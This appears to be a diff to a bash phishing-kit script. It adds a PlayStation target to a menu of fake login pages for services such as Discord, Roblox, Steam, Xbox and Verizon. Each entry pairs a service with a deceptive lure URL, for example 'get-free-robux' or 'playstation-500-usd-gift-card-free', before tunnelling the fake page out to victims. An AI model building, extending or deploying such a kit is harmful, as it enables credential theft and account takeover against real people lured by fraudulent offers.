@@ -720,12 +720,13 @@ main_menu() {
 		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Tiktok
 		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Snapchat
 		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Spotify
-		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Xbox
-		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Github
-		${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Discord
-		${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Roblox
-		${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Steam
-		${MAGENTA}[${CYAN}16${MAGENTA}]${BLUE} Verizon
+		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Github
+		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Discord
+		${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Roblox
+		${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Steam
+		${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Playstation
+		${MAGENTA}[${CYAN}16${MAGENTA}]${BLUE} Xbox
+		${MAGENTA}[${CYAN}17${MAGENTA}]${BLUE} Verizon
 		
 		${MAGENTA}[${CYAN}99${MAGENTA}]${BLUE} About         ${MAGENTA}[${CYAN}00${MAGENTA}]${BLUE} Exit
 
@@ -769,26 +770,30 @@ main_menu() {
 			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
 		11)
-			website="xbox"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		12)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
-		13)
+		12)
 			website="discord"
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
-		14)
+		13)
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
-		15)
+		14)
 			website="steam"
 			mask='https://steam-500-usd-gift-card-free'
 			tunnel_menu;;
+		15)
+			website="playstation"
+			mask='https://playstation-500-usd-gift-card-free'
+			tunnel_menu;;
 		16)
+			website="xbox"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		17)
 			website="verizon"
 			mask='https://get-unlimited-data'
 			tunnel_menu;;
